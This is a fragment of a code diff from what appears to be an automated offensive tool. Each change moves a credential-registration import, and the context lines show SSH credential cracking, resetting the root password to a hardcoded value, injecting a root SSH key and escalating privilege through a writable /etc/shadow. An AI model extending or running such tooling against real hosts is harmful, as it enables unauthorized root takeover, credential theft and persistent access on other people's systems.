@@ -235,7 +235,7 @@ def _harvest_credentials(client, host: str) -> str:
                     output += f"\n{crack_result}\n"
                     for cracked_user, cracked_pwd in hc.get_cracked_pairs():
                         try:
-                            from tools import register_credential
+                            from core.credentials import register_credential
                             register_credential("ssh", host, cracked_user, cracked_pwd)
                         except ImportError:
                             pass
@@ -682,7 +682,7 @@ void gconv_init() {
                                             print(f"    {C_GREEN}[+] Root password changed to 'octopus' — VERIFIED{C_RESET}")
                                             output += "\n[+] Root password changed to 'octopus' — SSH verified!\n"
                                             try:
-                                                from tools import register_credential
+                                                from core.credentials import register_credential
                                                 register_credential("ssh", host, "root", "octopus")
                                             except ImportError:
                                                 pass
@@ -732,7 +732,7 @@ void gconv_init() {
                                             output += "[+] SSH key injected for root — key auth verified!\n"
                                             # Register key-based root access
                                             try:
-                                                from tools import register_credential
+                                                from core.credentials import register_credential
                                                 register_credential("ssh", host, "root", "__KEY_AUTH__")
                                             except ImportError:
                                                 pass
@@ -832,7 +832,7 @@ void gconv_init() {
                         print(f"    {C_GREEN}[+] ROOT via writable /etc/shadow! Password: m3tatr0n{C_RESET}")
                         # Register new root credential
                         try:
-                            from tools import register_credential
+                            from core.credentials import register_credential
                             register_credential("ssh", host, "root", "m3tatr0n")
                         except ImportError:
                             pass
@@ -852,7 +852,7 @@ void gconv_init() {
                                     output += "  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL via SSH! root:m3tatr0n\n"
                                     print(f"    {C_GREEN}[+] ROOT via SSH with new shadow password!{C_RESET}")
                                     try:
-                                        from tools import register_credential
+                                        from core.credentials import register_credential
                                         register_credential("ssh", host, "root", "m3tatr0n")
                                     except ImportError:
                                         pass
@@ -959,7 +959,7 @@ void gconv_init() {
                     print(f"    {C_GREEN}[+] LOGIN: {target_user}:{pwd_attempt} → {id_out[:60]}{C_RESET}")
 
                     try:
-                        from tools import register_credential
+                        from core.credentials import register_credential
                         register_credential("ssh", host, target_user, pwd_attempt)
                     except ImportError:
                         pass
